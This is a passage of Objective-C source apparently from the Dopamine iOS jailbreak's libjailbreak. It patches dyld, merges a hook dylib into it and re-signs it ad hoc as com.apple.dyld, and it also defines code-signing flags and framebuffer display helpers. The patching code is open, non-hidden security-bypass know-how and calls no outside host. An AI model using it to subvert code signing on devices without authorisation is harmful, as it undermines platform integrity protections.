	NSString *dyldhookMergeDylibPath = [JBROOT_PATH(@"/basebin") stringByAppendingPathComponent:dyldhookMergeDylibName];
	int r = exec_cmd(JBROOT_PATH("/basebin/MachOMerger"), originalDyldPath.fileSystemRepresentation, dyldhookMergeDylibPath.fileSystemRepresentation, outPath.fileSystemRepresentation, NULL);
	if (r == 0) {
		r = chmod(outPath.fileSystemRepresentation, 0755);
	}
	return r;
}

int basebin_generate(bool comingFromJBUpdate)
{
	NSString *basebinPath    = JBROOT_PATH(@"/basebin");
	NSString *genPath        = JBROOT_PATH(@"/basebin/gen");
	NSString *fakelibPath    = JBROOT_PATH(@"/basebin/.fakelib");
	NSString *systemhookPath = JBROOT_PATH(@"/basebin/systemhook.dylib");

	[[NSFileManager defaultManager] createDirectoryAtPath:genPath withIntermediateDirectories:YES attributes:nil error:nil];

	NSString *fakelibDyldPath        = [fakelibPath stringByAppendingPathComponent:@"dyld"];
	NSString *fakelibSystemHookPath  = [fakelibPath stringByAppendingPathComponent:@"systemhook.dylib"];

	NSString *dyldOrigPath     = [genPath stringByAppendingPathComponent:@"dyld.orig"];
	NSString *dyldInflightPath = [genPath stringByAppendingPathComponent:@"dyld.inflight"];
	NSString *dyldOldPath      = [genPath stringByAppendingPathComponent:@"dyld.old"];
	NSString *dyldPatchedPath  = [genPath stringByAppendingPathComponent:@"dyld"];

	NSString *dopamineVersion = [NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil];
	if (!dopamineVersion) return 1;

	if (!comingFromJBUpdate) {
		// Copy /usr/lib to /var/jb/basebin/.fakelib
		[[NSFileManager defaultManager] removeItemAtPath:fakelibPath error:nil];
		[[NSFileManager defaultManager] createDirectoryAtPath:fakelibPath withIntermediateDirectories:YES attributes:nil error:nil];
		carbonCopy(@"/usr/lib", fakelibPath);

		// Delete the dyld inside .fakelib
		[[NSFileManager defaultManager] removeItemAtPath:fakelibDyldPath error:nil];

		// Symlink .fakelib/dyld -> /var/jb/basebin/gen/dyld
		[[NSFileManager defaultManager] createSymbolicLinkAtPath:fakelibDyldPath withDestinationPath:dyldPatchedPath error:nil];

		// Symlink .fakelib/systemhook.dylib -> /var/jb/basebin/systemhook.dylib
		[[NSFileManager defaultManager] createSymbolicLinkAtPath:fakelibSystemHookPath withDestinationPath:systemhookPath error:nil];

		// Backup original dyld
		carbonCopy(@"/usr/lib/dyld", dyldOrigPath);
	}

	carbonCopy(dyldOrigPath, dyldInflightPath);

	NSString *dyldUUIDPrefix = [@"DOPA" stringByAppendingString:dopamineVersion];
	if (apply_dyld_patch(dyldInflightPath, dyldUUIDPrefix.UTF8String) != 0) return 2;
	if (merge_dyldhook(dyldInflightPath, dyldInflightPath) != 0) return 3;
	if (resign_file(dyldInflightPath, @"com.apple.dyld", YES) != 0) return 4;

	if (comingFromJBUpdate) {
		// We cannot delete dyld as this point because it's still in use
		// If we did this, we'd panic the system
		// So we will move the past patched dyld to dyld.old to keep the vnode alive
		// If there is another dyld.old at this point, we will remove it now
		// since it is guaranteed to not be in use at this point
		if ([[NSFileManager defaultManager] fileExistsAtPath:dyldOldPath]) {
			[[NSFileManager defaultManager] removeItemAtPath:dyldOldPath error:nil];
		}
		[[NSFileManager defaultManager] moveItemAtPath:dyldPatchedPath toPath:dyldOldPath error:nil];
	}

	[[NSFileManager defaultManager] moveItemAtPath:dyldInflightPath toPath:dyldPatchedPath error:nil];
	return 0;
}
```

`BaseBin/libjailbreak/src/carboncopy.h`:

```h
#ifndef __CARBONCOPY_H
#define __CARBONCOPY_H

#import <Foundation/Foundation.h>

int carbonCopy(NSString *sourcePath, NSString *targetPath);

#endif
```

`BaseBin/libjailbreak/src/carboncopy.m`:

```m
#import <Foundation/Foundation.h>
#import <sandbox.h>
#import <sys/param.h>
#import <sys/mount.h>
#import <copyfile.h>

NSArray *writableFileAttributes(void)
{
	static NSArray *attributes = nil;
	static dispatch_once_t onceToken;
	dispatch_once (&onceToken, ^{
		attributes = @[NSFileBusy, NSFileCreationDate, NSFileExtensionHidden, NSFileGroupOwnerAccountID, NSFileGroupOwnerAccountName, NSFileHFSCreatorCode, NSFileHFSTypeCode, NSFileImmutable, NSFileModificationDate, NSFileOwnerAccountID, NSFileOwnerAccountName, NSFilePosixPermissions];
	});
	return attributes;
}

NSDictionary *writableAttributes(NSDictionary *attributes)
{
	NSArray *writableAttributes = writableFileAttributes();
	NSMutableDictionary *newDict = [NSMutableDictionary new];

	[attributes enumerateKeysAndObjectsUsingBlock:^(NSString *attributeKey, NSObject *attribute, BOOL *stop) {
		if([writableAttributes containsObject:attributeKey]) {
			newDict[attributeKey] = attribute;
		}
	}];

	return newDict.copy;
}

bool fileExistsOrSymlink(NSString *path, BOOL *isDirectory)
{
	if ([[NSFileManager defaultManager] fileExistsAtPath:path isDirectory:isDirectory]) return YES;
	if ([[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil]) return YES;
	return NO;
}

int carbonCopySingle(NSString *sourcePath, NSString *targetPath)
{
	BOOL isDirectory = NO;
	BOOL exists = fileExistsOrSymlink(sourcePath, &isDirectory);
	if (!exists) {
		return 1;
	}

	if (fileExistsOrSymlink(targetPath, nil)) {
		[[NSFileManager defaultManager] removeItemAtPath:targetPath error:nil];
	}

	NSDictionary* attributes = writableAttributes([[NSFileManager defaultManager] attributesOfItemAtPath:sourcePath error:nil]);
	if (isDirectory) {
		return [[NSFileManager defaultManager] createDirectoryAtPath:targetPath withIntermediateDirectories:NO attributes:attributes error:nil] != YES;
	}
	else {
		if ([[NSFileManager defaultManager] copyItemAtPath:sourcePath toPath:targetPath error:nil]) {
			[[NSFileManager defaultManager] setAttributes:attributes ofItemAtPath:targetPath error:nil];
			return 0;
		}
		return 1;
	}
}

int carbonCopy(NSString *sourcePath, NSString *targetPath)
{
	int retval = 0;
	BOOL isDirectory = NO;
	BOOL exists = fileExistsOrSymlink(sourcePath, &isDirectory);
	if (exists) {
		if (isDirectory) {
			retval = carbonCopySingle(sourcePath, targetPath);
			if (retval == 0) {
				NSDirectoryEnumerator *enumerator = [[NSFileManager defaultManager] enumeratorAtPath:sourcePath];
				for (NSString *relativePath in enumerator) {
					@autoreleasepool {
						NSString *subSourcePath = [sourcePath stringByAppendingPathComponent:relativePath];
						NSString *subTargetPath = [targetPath stringByAppendingPathComponent:relativePath];
						retval = carbonCopySingle(subSourcePath, subTargetPath);
						if (retval != 0) break;
					}
				}
			}
			
		}
		else {
			retval = carbonCopySingle(sourcePath, targetPath);
		}
	}
	else {
		retval = 1;
	}
	return retval;
}

```

`BaseBin/libjailbreak/src/codesign.h`:

```h
#ifndef LJB_CODESIGN_H
#define LJB_CODESIGN_H

#include <choma/CodeDirectory.h>

/* code signing attributes of a process */
#define CS_VALID                    0x00000001  /* dynamically valid */
#define CS_ADHOC                    0x00000002  /* ad hoc signed */
#define CS_GET_TASK_ALLOW           0x00000004  /* has get-task-allow entitlement */
#define CS_INSTALLER                0x00000008  /* has installer entitlement */

#define CS_FORCED_LV                0x00000010  /* Library Validation required by Hardened System Policy */
#define CS_INVALID_ALLOWED          0x00000020  /* (macOS Only) Page invalidation allowed by task port policy */

#define CS_HARD                     0x00000100  /* don't load invalid pages */
#define CS_KILL                     0x00000200  /* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION         0x00000400  /* force expiration checking */
#define CS_RESTRICT                 0x00000800  /* tell dyld to treat restricted */

#define CS_ENFORCEMENT              0x00001000  /* require enforcement */
#define CS_REQUIRE_LV               0x00002000  /* require library validation */
#define CS_ENTITLEMENTS_VALIDATED   0x00004000  /* code signature permits restricted entitlements */
#define CS_NVRAM_UNRESTRICTED       0x00008000  /* has com.apple.rootless.restricted-nvram-variables.heritable entitlement */

#define CS_RUNTIME                  0x00010000  /* Apply hardened runtime policies */
#define CS_LINKER_SIGNED            0x00020000  /* Automatically signed by the linker */

#define CS_ALLOWED_MACHO            (CS_ADHOC | CS_HARD | CS_KILL | CS_CHECK_EXPIRATION | \
	                             CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV | CS_RUNTIME | CS_LINKER_SIGNED)

#define CS_EXEC_SET_HARD            0x00100000  /* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL            0x00200000  /* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT     0x00400000  /* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_INHERIT_SIP         0x00800000  /* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED                   0x01000000  /* was killed by kernel for invalidity */
#define CS_NO_UNTRUSTED_HELPERS     0x02000000  /* kernel did not load a non-platform-binary dyld or Rosetta runtime */
#define CS_DYLD_PLATFORM            CS_NO_UNTRUSTED_HELPERS /* old name */
#define CS_PLATFORM_BINARY          0x04000000  /* this is a platform binary */
#define CS_PLATFORM_PATH            0x08000000  /* platform binary by the fact of path (osx only) */

#define CS_DEBUGGED                 0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_SIGNED                   0x20000000  /* process has a signature (may have gone invalid) */
#define CS_DEV_CODE                 0x40000000  /* code is dev signed, cannot be loaded into prod signed code (will go away with rdar://problem/28322552) */
#define CS_DATAVAULT_CONTROLLER     0x80000000  /* has Data Vault controller entitlement */

#define CS_ENTITLEMENT_FLAGS        (CS_GET_TASK_ALLOW | CS_INSTALLER | CS_DATAVAULT_CONTROLLER | CS_NVRAM_UNRESTRICTED)

/* csops  operations */
#define	CS_OPS_STATUS		0	/* return status */
#define	CS_OPS_MARKINVALID	1	/* invalidate process */
#define	CS_OPS_MARKHARD		2	/* set HARD flag */
#define	CS_OPS_MARKKILL		3	/* set KILL flag (sticky) */
#define	CS_OPS_PIDPATH		4	/* get executable's pathname */
#define	CS_OPS_CDHASH		5	/* get code directory hash */
#define CS_OPS_PIDOFFSET	6	/* get offset of active Mach-o slice */
#define CS_OPS_ENTITLEMENTS_BLOB 7	/* get entitlements blob */
#define CS_OPS_MARKRESTRICT	8	/* set RESTRICT flag (sticky) */
#define CS_OPS_IDENTITY     11  /* get codesign identity */

int csops(pid_t pid, unsigned int  ops, void * useraddr, size_t usersize);
int csops_audittoken(pid_t pid, unsigned int ops, void * useraddr, size_t usersize, audit_token_t * token);

#ifdef __OBJC__
#import <Foundation/Foundation.h>
int resign_file(NSString *filePath, NSString *identifier, bool preserveMetadata);
#endif

#endif
```

`BaseBin/libjailbreak/src/codesign.m`:

```m
#include <Foundation/Foundation.h>
#include <Security/Security.h>
#include <TargetConditionals.h>
#import "libjailbreak.h"

#ifdef __cplusplus
extern "C" {
#endif

#if TARGET_OS_OSX
#include <Security/SecCode.h>
#include <Security/SecStaticCode.h>
#else

// CSCommon.h
typedef struct CF_BRIDGED_TYPE(id) __SecCode const* SecStaticCodeRef; /* code on disk */

typedef CF_OPTIONS(uint32_t, SecCSFlags) {
    kSecCSDefaultFlags = 0, /* no particular flags (default behavior) */

    kSecCSConsiderExpiration = 1U << 31,     /* consider expired certificates invalid */
    kSecCSEnforceRevocationChecks = 1 << 30, /* force revocation checks regardless of preference settings */
    kSecCSNoNetworkAccess = 1 << 29,         /* do not use the network, cancels "kSecCSEnforceRevocationChecks"  */
    kSecCSReportProgress = 1 << 28,          /* make progress report call-backs when configured */
    kSecCSCheckTrustedAnchors = 1 << 27,     /* build certificate chain to system trust anchors, not to any self-signed certificate */
    kSecCSQuickCheck = 1 << 26,              /* (internal) */
    kSecCSApplyEmbeddedPolicy = 1 << 25,     /* Apply Embedded (iPhone) policy regardless of the platform we're running on */
};

typedef CF_OPTIONS(uint32_t, SecPreserveFlags) {
	kSecCSPreserveIdentifier = 1 << 0,
	kSecCSPreserveRequirements = 1 << 1,
	kSecCSPreserveEntitlements = 1 << 2,
	kSecCSPreserveResourceRules = 1 << 3,
	kSecCSPreserveFlags = 1 << 4,
	kSecCSPreserveTeamIdentifier = 1 << 5,
	kSecCSPreserveDigestAlgorithm = 1 << 6,
	kSecCSPreservePreEncryptHashes = 1 << 7,
	kSecCSPreserveRuntime = 1 << 8,
};

// SecStaticCode.h
OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes,
                                                  SecStaticCodeRef* __nonnull CF_RETURNS_RETAINED staticCode);

// SecCode.h
CF_ENUM(uint32_t){
    kSecCSInternalInformation = 1 << 0, kSecCSSigningInformation = 1 << 1, kSecCSRequirementInformation = 1 << 2,
    kSecCSDynamicInformation = 1 << 3,  kSecCSContentInformation = 1 << 4, kSecCSSkipResourceDirectory = 1 << 5,
    kSecCSCalculateCMSDigest = 1 << 6,
};

OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef* __nonnull CF_RETURNS_RETAINED information);

extern const CFStringRef kSecCodeInfoEntitlements;    /* generic */
extern const CFStringRef kSecCodeInfoIdentifier;      /* generic */
extern const CFStringRef kSecCodeInfoRequirementData; /* Requirement */

#endif

// SecCodeSigner.h
#ifdef BRIDGED_SECCODESIGNER
typedef struct CF_BRIDGED_TYPE(id) __SecCodeSigner* SecCodeSignerRef SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#else
typedef struct __SecCodeSigner* SecCodeSignerRef SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#endif

extern const CFStringRef kSecCodeSignerTeamIdentifier SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerEntitlements SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerIdentifier SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerIdentity SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerPreserveMetadata SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerRequirements SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerResourceRules SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));

#ifdef BRIDGED_SECCODESIGNER
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags, SecCodeSignerRef* __nonnull CF_RETURNS_RETAINED signer)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#else
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags, SecCodeSignerRef* signer)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#endif

OSStatus SecCodeSignerAddSignatureWithErrors(SecCodeSignerRef signer, SecStaticCodeRef code, SecCSFlags flags, CFErrorRef* errors)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));

// SecCodePriv.h
extern const CFStringRef kSecCodeInfoResourceDirectory; /* Internal */

#ifdef __cplusplus
}
#endif

int resign_file(NSString *filePath, NSString *identifier, bool preserveMetadata)
{
	OSStatus status = 0;
	int retval = 200;

	// the special value "-" (dash) indicates ad-hoc signing
	SecIdentityRef identity = (SecIdentityRef)kCFNull;
	NSMutableDictionary* parameters = [[NSMutableDictionary alloc] init];
	parameters[(__bridge NSString*)kSecCodeSignerIdentity] = (__bridge id)identity;
	if (preserveMetadata) {
		parameters[(__bridge NSString*)kSecCodeSignerPreserveMetadata] = @(kSecCSPreserveIdentifier | kSecCSPreserveRequirements | kSecCSPreserveEntitlements | kSecCSPreserveResourceRules);
	}

	if (identifier) {
		parameters[(__bridge NSString *)kSecCodeSignerIdentifier] = identifier;
	}

	SecCodeSignerRef signerRef;
	status = SecCodeSignerCreate((__bridge CFDictionaryRef)parameters, kSecCSDefaultFlags, &signerRef);
	if (status == 0) {
		SecStaticCodeRef code;
		status = SecStaticCodeCreateWithPathAndAttributes((__bridge CFURLRef)[NSURL fileURLWithPath:filePath], kSecCSDefaultFlags, NULL, &code);
		if (status == 0) {
			status = SecCodeSignerAddSignatureWithErrors(signerRef, code, kSecCSDefaultFlags, NULL);
			if (status == 0) {
				CFDictionaryRef newSigningInformation;
				// Difference from codesign: added kSecCSSigningInformation, kSecCSRequirementInformation, kSecCSInternalInformation
				status = SecCodeCopySigningInformation(code, kSecCSDefaultFlags | kSecCSSigningInformation | kSecCSRequirementInformation | kSecCSInternalInformation, &newSigningInformation);
				if (status == 0) {
					printf("SecCodeCopySigningInformation succeeded: %s\n", ((__bridge NSDictionary*)newSigningInformation).description.UTF8String);
					retval = 0;
					CFRelease(newSigningInformation);
				} else {
					printf("SecCodeCopySigningInformation failed: %s (%d)\n", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
					retval = 203;
				}
			}
			CFRelease(code);
		}
		else {
			printf("SecStaticCodeCreateWithPathAndAttributes failed: %s (%d)\n", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
			retval = 202;
		}
		CFRelease(signerRef);
	}
	else {
		printf("SecCodeSignerCreate failed: %s (%d)\n", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
		retval = 201;
	}

	return retval;
}

```

`BaseBin/libjailbreak/src/display.h`:

```h
#ifndef LJB_DISPLAY_H
#define LJB_DISPLAY_H

#import <IOMobileFramebuffer/IOMobileFramebuffer.h>
#import <CoreGraphics/CoreGraphics.h>

CGSize find_display_size(void);

int draw_image_to_buf(CGImageRef cgImage, IOMobileFramebufferDisplaySize size, CGFloat rotation, void **bufOut, size_t *bufSizeOut);
int draw_image_to_buf_for_main_screen(CGImageRef image, void **bufOut, size_t *bufSizeOut);
int draw_image_path_to_buf(const char* image_path, IOMobileFramebufferDisplaySize size, CGFloat rotation, void **bufOut, size_t *bufSizeOut);
int draw_image_path_to_buf_for_main_screen(const char* image_path, void **bufOut, size_t *bufSizeOut);
int save_image_bitmap_to_plist(CGImageRef imageRef, const char *outPath);
CGImageRef load_image_from_bitmap_plist(const char *bitmapPlistPath);
int display_draw_raw_path(const char *path);
int display_draw_raw(void *rawBuf, size_t rawBufSize);
int display_draw_image_path(const char* image_path);
int display_draw_image(CGImageRef cgImage);

#endif

```

`BaseBin/libjailbreak/src/display.m`:

```m
#include "display.h"

#import <Foundation/Foundation.h>
#import <IOMobileFramebuffer/IOMobileFramebuffer.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <dlfcn.h>

#define RADIANS(degrees) ( degrees * M_PI / 180 )

CFTypeRef MGCopyAnswer(CFStringRef str);

struct display {
	bool inited;
	void *base;
	IOMobileFramebufferDisplaySize size;
	int bytesPerRow;
	IOMobileFramebufferRef display;
	IOSurfaceRef surface;
} gDisplay;

int display_update(void)
{
	if (!gDisplay.display) return -1;

	int token;
	IOMobileFramebufferSwapBegin(gDisplay.display, &token);
	IOMobileFramebufferSwapSetLayer(gDisplay.display, 0, gDisplay.surface, (CGRect){ { 0, 0 }, { gDisplay.size.width, gDisplay.size.height } }, (CGRect){ { 0, 0 }, { gDisplay.size.width, gDisplay.size.height } }, 0);
	return IOMobileFramebufferSwapEnd(gDisplay.display);
}

IOMobileFramebufferReturn find_target_display(IOMobileFramebufferRef *pointer)
{
	if (!pointer) return -1;

	IOMobileFramebufferReturn r = IOMobileFramebufferGetMainDisplay(pointer);
	if (r != 0) {
		r = IOMobileFramebufferGetSecondaryDisplay(pointer);
	}

	return r;
}

CGSize find_display_size(void)
{
	CGSize displaySize = CGSizeMake(0,0);

	IOMobileFramebufferRef targetDisplay;
	IOMobileFramebufferReturn r = find_target_display(&targetDisplay);
	if (r == 0) {
		IOMobileFramebufferGetDisplaySize(targetDisplay, &displaySize);
	}
	else {
		// If we aren't entitled to get the display info from IOMobileFramebuffer, get it from GraphicsServices instead
		static CGSize (*__GSMainScreenPixelSize)(void) = NULL;
		if (!__GSMainScreenPixelSize) {
			void *graphicsServiceHandle = dlopen("/System/Library/PrivateFrameworks/GraphicsServices.framework/GraphicsServices", RTLD_NOW);
			__GSMainScreenPixelSize = dlsym(graphicsServiceHandle, "GSMainScreenPixelSize");
		}

		if (__GSMainScreenPixelSize) {
			displaySize = __GSMainScreenPixelSize();
		}
	}

	return displaySize;
}

IOSurfaceRef create_iosurface_for_display(IOMobileFramebufferDisplaySize size, uint32_t cacheMode)
{
	size_t bytesPerRow = IOSurfaceAlignProperty(kIOSurfaceBytesPerRow, 4 * size.width);

	NSDictionary *properties = @{
		(__bridge id)kIOSurfaceWidth : @(size.width),
		(__bridge id)kIOSurfaceHeight : @(size.height),
		(__bridge id)kIOSurfacePixelFormat : @0x42475241, // 'ARGB'
		(__bridge id)kIOSurfaceBytesPerRow : @(bytesPerRow),
		(__bridge id)kIOSurfaceCacheMode : @(cacheMode),
	};

	return IOSurfaceCreate((__bridge CFDictionaryRef)properties);
}

int display_init_internal(bool useDCPFlags)
{
	if (gDisplay.inited) return 0;

	int r = find_target_display(&gDisplay.display);
	if (r) return r;
	gDisplay.size = find_display_size();

	gDisplay.surface = create_iosurface_for_display(gDisplay.size, useDCPFlags ? kIOMapWriteCombineCache | kIOMapInhibitCache | kIOMapWriteThruCache | kIOMapCopybackCache : kIOMapWriteCombineCache);

	IOSurfaceLock(gDisplay.surface, 0, 0);
	gDisplay.base = IOSurfaceGetBaseAddress(gDisplay.surface);
	gDisplay.bytesPerRow = IOSurfaceGetBytesPerRow(gDisplay.surface);
	IOSurfaceUnlock(gDisplay.surface, 0, 0);

	kern_return_t kr = display_update();
	if (kr == KERN_SUCCESS) {
		gDisplay.inited = true;
	}
	else {
		CFRelease(gDisplay.surface);
		if (kr == kIOReturnBadMedia) {
			return kIOReturnBadMedia;
		}
		return -1;
	}
	return 0;
}

int display_init(void)
{
	int r = display_init_internal(false);
	if (r == kIOReturnBadMedia) {
		return display_init_internal(true);
	}
	return r;
}

int display_reset(void)
{
	if (!gDisplay.base) return -1;

	memset(gDisplay.base, 0, gDisplay.size.height * gDisplay.bytesPerRow);
	display_update();
	return 0;
}

int draw_image_to_buf(CGImageRef cgImage, IOMobileFramebufferDisplaySize size, CGFloat rotation, void **bufOut, size_t *bufSizeOut)
{
	size_t bytesPerRow = IOSurfaceAlignProperty(kIOSurfaceBytesPerRow, 4 * size.width);

	int retval = -1;
	CGContextRef context = NULL;
	CGColorSpaceRef rgbColorSpace = NULL;
	char *tmpBuf = NULL;
	size_t bufSize = size.height * bytesPerRow;

	rgbColorSpace = CGColorSpaceCreateDeviceRGB();
	if (!rgbColorSpace) goto finish;

	tmpBuf = malloc(bufSize);
	if (!tmpBuf) goto finish;
	memset(tmpBuf, 0, bufSize);

	context = CGBitmapContextCreate(tmpBuf, size.width, size.height, 8, bytesPerRow, rgbColorSpace, kCGImageAlphaPremultipliedFirst | kCGImageByteOrder32Little);
	if (!context) goto finish;

	CGFloat imageWidth  = CGImageGetWidth(cgImage);
	CGFloat imageHeight = CGImageGetHeight(cgImage);

	CGFloat radians = RADIANS(rotation);
	CGFloat cosTheta = fabs(cos(radians));
	CGFloat sinTheta = fabs(sin(radians));

	CGFloat rotatedWidth  = imageWidth * cosTheta + imageHeight * sinTheta;
	CGFloat rotatedHeight = imageWidth * sinTheta + imageHeight * cosTheta;

	CGFloat scale = MAX(size.width  / rotatedWidth, size.height / rotatedHeight);

	CGContextTranslateCTM(context, size.width  * 0.5, size.height * 0.5);
	CGContextRotateCTM(context, radians);
	CGContextScaleCTM(context, scale, scale);

	CGRect imageRect = CGRectMake(-imageWidth  * 0.5, -imageHeight * 0.5, imageWidth, imageHeight);

	CGContextDrawImage(context, imageRect, cgImage);

	*bufOut = tmpBuf;
	*bufSizeOut = bufSize;
	tmpBuf = NULL;
	retval = 0;

finish:
	if (context) CGContextRelease(context);
	if (rgbColorSpace) CGColorSpaceRelease(rgbColorSpace);
	if (tmpBuf) free(tmpBuf);

	return retval;
}

BOOL is_ipad(void)
{
	CFStringRef deviceClass = MGCopyAnswer(CFSTR("DeviceClass"));
	if (!deviceClass) return NO;
	BOOL result = CFStringCompare(deviceClass, CFSTR("iPad"), 0) == kCFCompareEqualTo;
	CFRelease(deviceClass);
	return result;
}

CGFloat get_main_screen_rotation(void)
{
	if (is_ipad()) {
		CFNumberRef mainScreenOrientationNum = MGCopyAnswer(CFSTR("main-screen-orientation"));
		if (mainScreenOrientationNum) {
			unsigned long long mainScreenOrientation = [(__bridge NSNumber *)mainScreenOrientationNum unsignedLongLongValue];
			if (mainScreenOrientation == 0) { // iPads that have a non landscape base orientation...
				CFNumberRef displayBootRotationNum = MGCopyAnswer(CFSTR("DisplayBootRotation"));
				unsigned long long displayBootRotation = [(__bridge NSNumber *)displayBootRotationNum unsignedLongLongValue]; // ...need to take the displayBootRotation as the image rotation

				switch (displayBootRotation) {
					case 0:
					return 0;
					case 90:
					return 270;
					case 180:
					return 180;
					case 270:
					return 90;
				}
			}
			else { // iPads that DO have a lanscape base orientation...
				CFNumberRef displayBootRotationNum = MGCopyAnswer(CFSTR("DisplayBootRotation"));
				unsigned long long displayBootRotation = [(__bridge NSNumber *)displayBootRotationNum unsignedLongLongValue];
				switch (displayBootRotation) {
					case 0:
					return 90;
					case 90:
					return 0;
					case 180:
					return 270;
					case 270:
					return 180;
				}
			}
		}
	}

	return 0;
}

int draw_image_to_buf_for_main_screen(CGImageRef image, void **bufOut, size_t *bufSizeOut)
{
	return draw_image_to_buf(image, find_display_size(), get_main_screen_rotation(), bufOut, bufSizeOut);
}

int display_draw_raw_path(const char *path)
{
	int retval = display_init();
	if (retval) return retval;

	bool worked = false;
	int fd = open(path, O_RDONLY);
	if (fd >= 0) {
		struct stat s;
		if (fstat(fd, &s) == 0) {
			size_t displayBufSize = gDisplay.size.height * gDisplay.bytesPerRow;
			if (displayBufSize == s.st_size) {
				worked = true;
				read(fd, gDisplay.base, s.st_size);
			}
		}
		close(fd);
	}

	if (!worked) return -1;

	return display_update();
}

static CGImageRef load_image(const char *image_path)
{
	CFURLRef imageURL = NULL;
	CGImageSourceRef cgImageSource = NULL;
	CGImageRef cgImage = NULL;
	CFStringRef bootImageCfString = NULL;

	bootImageCfString = CFStringCreateWithCString(kCFAllocatorDefault, image_path, kCFStringEncodingUTF8);
	if (!bootImageCfString) goto finish;
	imageURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, bootImageCfString, kCFURLPOSIXPathStyle, false);
	if (!imageURL) goto finish;
	cgImageSource = CGImageSourceCreateWithURL(imageURL, NULL);
	if (!cgImageSource) goto finish;
	cgImage = CGImageSourceCreateImageAtIndex(cgImageSource, 0, NULL);
	if (!cgImage) goto finish;

finish:
	if (bootImageCfString) CFRelease(bootImageCfString);
	if (imageURL) CFRelease(imageURL);
	if (cgImageSource) CFRelease(cgImageSource);

	return cgImage;
}

int save_image_bitmap_to_plist(CGImageRef imageRef, const char *outPath)
{
	if (!imageRef) return -1;

	CGDataProviderRef dataProvider = CGImageGetDataProvider(imageRef);
	if (!dataProvider) return -1;
	CFDataRef data = CGDataProviderCopyData(dataProvider);
	if (!data) return -1;
	
	NSDictionary *imagePlist = @{
		@"width" : @(CGImageGetWidth(imageRef)),
		@"height" : @(CGImageGetHeight(imageRef)),
		@"bitsPerComponent" : @(CGImageGetBitsPerComponent(imageRef)),
		@"bitsPerPixel" : @(CGImageGetBitsPerPixel(imageRef)),
		@"bytesPerRow" : @(CGImageGetBytesPerRow(imageRef)),
		@"bitmapData" : (__bridge id)data,
	};

	CFRelease(data);

	return [imagePlist writeToURL:[NSURL fileURLWithPath:[NSString stringWithUTF8String:outPath]] error:nil] != true;
}

CGImageRef load_image_from_bitmap_plist(const char *bitmapPlistPath)
{
	NSDictionary *imagePlist = [NSDictionary dictionaryWithContentsOfURL:[NSURL fileURLWithPath:[NSString stringWithUTF8String:bitmapPlistPath]] error:nil];
	if (!imagePlist) return NULL;

	size_t width = ((NSNumber *)imagePlist[@"width"]).unsignedLongLongValue;
	size_t height = ((NSNumber *)imagePlist[@"height"]).unsignedLongLongValue;
	size_t bitsPerComponent = ((NSNumber *)imagePlist[@"bitsPerComponent"]).unsignedLongLongValue;
	size_t bitsPerPixel = ((NSNumber *)imagePlist[@"bitsPerPixel"]).unsignedLongLongValue;
	size_t bytesPerRow = ((NSNumber *)imagePlist[@"bytesPerRow"]).unsignedLongLongValue;
	NSData *bitmapData = imagePlist[@"bitmapData"];
	const void *bitmapBuffer = bitmapData.bytes;

	if ((height * bytesPerRow) != bitmapData.length) {
		return NULL;
	}

	CGDataProviderRef provider = CGDataProviderCreateWithData(NULL, bitmapBuffer, height * bytesPerRow, NULL);

	CGColorSpaceRef colorSpaceRef = CGColorSpaceCreateDeviceRGB();
	CGBitmapInfo bitmapInfo = kCGBitmapByteOrderDefault;
	CGColorRenderingIntent renderingIntent = kCGRenderingIntentDefault;

	CGImageRef imageRef = CGImageCreate(width,
		height,
		bitsPerComponent,
		bitsPerPixel,
		bytesPerRow,
		colorSpaceRef,
		bitmapInfo,
		provider,
		NULL,
		NO,
		renderingIntent);

	CGDataProviderRelease(provider);
	CGColorSpaceRelease(colorSpaceRef);
	
	return imageRef;
}

int draw_image_path_to_buf(const char* image_path, IOMobileFramebufferDisplaySize size, CGFloat rotation, void **bufOut, size_t *bufSizeOut)
{
	CGImageRef cgImage = load_image(image_path);
	if (!cgImage) return -1;
	int r = draw_image_to_buf(cgImage, size, rotation, bufOut, bufSizeOut);
	CGImageRelease(cgImage);
	return r;
}

int draw_image_path_to_buf_for_main_screen(const char* image_path, void **bufOut, size_t *bufSizeOut)
{
	CGImageRef cgImage = load_image(image_path);
